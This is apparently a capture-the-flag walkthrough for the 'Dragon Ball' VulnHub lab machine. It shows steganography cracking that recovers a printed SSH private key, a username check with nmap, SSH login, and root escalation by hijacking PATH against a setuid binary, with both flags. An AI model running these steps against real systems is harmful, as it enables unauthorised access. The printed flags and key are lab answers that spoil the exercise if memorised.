# Dragon Ball

## Flags

### local.txt

On the end of the page, we can see a base64 encoded string

```bash
    $ echo VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 | base64 --decode
    UkZKQlIwOU9JRUpCVEV3PQ==
    
    $ echo UkZKQlIwOU9JRUpCVEV3PQ== | base64 --decode
    RFJBR09OIEJBTEw=

    $ echo RFJBR09OIEJBTEw= | base64 --decode
    DRAGON BALL
```

This could be the hidden dir, so we go to `http://10.0.0.34/DRAGON BALL/`

There, there is the `/Vulnhub` directory with the following:

- login.html
- aj.jpg

With this, we download the `aj.jpg` and check if there is any hidden information on the image (stegnography)

```bash
    $ stegcracker /home/kali/Downloads/aj.jpg

    StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
    Copyright (c) 2025 - Luke Paris (Paradoxis)

    StegCracker has been retired following the release of StegSeek, which 
    will blast through the rockyou.txt wordlist within 1.9 second as opposed 
    to StegCracker which takes ~5 hours.

    StegSeek can be found at: https://github.com/RickdeJager/stegseek

    No wordlist was specified, using default rockyou.txt wordlist.
    Counting lines in wordlist..
    Attacking file '/home/kali/Downloads/aj.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
    Successfully cracked file with password: love
    Tried 387 passwords
    Your file has been written to: /home/kali/Downloads/aj.jpg.out
    love

```

When we check `/home/kali/Downloads/aj.jpg.out`, the file we obtained from the `stegcracker` has the following content:

```bash
    $ cat aj.jpg.out

    -----BEGIN OPENSSH PRIVATE KEY-----
    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
    Bd8180GtBAAaGtiwAAAAlrYWxpQGthbGk=
    -----END OPENSSH PRIVATE KEY-----
```

With this ssh key, we are only missing the username

Here, `xmen` attempt was used because when we go to `http://10.0.0.34/DRAGON%20BALL/Vulnhub/login.html`, it appears "WELCOME TO xmen" otherwise we would try to brute-force the username using `rockyou.txt`

```bash
    $ nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "aj", "xmen"}, privatekeys={"/home/kali/Downloads/aj.jpg.out"}' 10.0.0.34

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 19:44 EST
    NSE: [ssh-publickey-acceptance] Failed to authenticate
    NSE: [ssh-publickey-acceptance] Failed to authenticate
    NSE: [ssh-publickey-acceptance] Found accepted key: /home/kali/Downloads/aj.jpg.out for user xmen
    Nmap scan report for 10.0.0.34
    Host is up (0.018s latency).

    PORT   STATE SERVICE
    22/tcp open  ssh
    | ssh-publickey-acceptance: 
    |   Accepted Public Keys: 
    |_    Key /home/kali/Downloads/aj.jpg.out accepted for user xmen

    Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
```

Then, we try to ssh into the target, but we get:

```bash
    $ ssh -i /home/kali/Downloads/aj.jpg.out xmen@10.0.0.34

    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    Permissions 0664 for '/home/kali/Downloads/aj.jpg.out' are too open.
    It is required that your private key files are NOT accessible by others.
    This private key will be ignored.
    Load key "/home/kali/Downloads/aj.jpg.out": bad permissions
    xmen@10.0.0.34's password: 
```

To fix this, we do:

```bash
    # make sure you own the file
    $ sudo chown $(whoami):$(whoami) /home/kali/Downloads/aj.jpg.out

    # set strict permissions so only you can read/write
    $ chmod 600 /home/kali/Downloads/aj.jpg.out
```

Finally we ssh, we get access to the target. If we do `ls` we have the `local.txt` that contains our 1st flag:

`your flag: 192fb6275698b5ad9868c7afb62fd555`

### proof.txt

Since we already have ssh access to the target, we go to the home dir of `xmen` and if we list everything in that dir, this is what we get:

```bash
    $ ls -al

    -rw-r--r-- 1 root root    75 Jan  4  2021 demo.c
    -rwsr-xr-x 1 root root 16712 Jan  4  2021 shell
```

We can see that there is a `s` in `shell` file. This means that when any user runs this script, it will execute with the privileges of the file owner. Since the file is owned by root, the script will run with root privileges.

We also know that shell is a compilation of demo.c that looks like this

```bash
    $ cat demo.c

    #include<unistd.h>
    void main()
    { 
        setuid(0);
        setgid(0);
        system("ps");
    }

```

If we inject a malicous binary, we can elevate our priviledges, since the instruction `system("ps")` does not specify the exact path to the binary

To elevate our privileges, we need to create another binary and put a reference to it in `$PATH`

Before any changes, if we check `$PATH`, we can see the following on $PATH

```bash
    $ echo $PATH
    /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

If we put `/home/xmen` directory first, the first binary to be used when `ps` is executed it will be our malicious binary. But first we change the `$PATH` like so:

```bash
    export PATH=/home/xmen:$PATH
```

And now `$PATH` looks like:

```bash
    $ echo $PATH
    /home/xmen:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Now on `/home/xmen` we do:

```bash
    # Get high privileges
    $ echo "/bin/bash" > /home/xmen/ps

    # Give permissions to the script
    $ chmod +x ps

    # Check
    $ which ps
    /home/xmen/ps
```

If I now execute `~/scripts/shell`, we get a shell as root, by executing the script, I can then check:

```bash
    $ id
    uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(xmen)
```

Now I go to `/root` and I can see the `proof.txt` with flag:

`your flag: 031f7d2d89b9dd2da3396a0d7b7fb3e2`
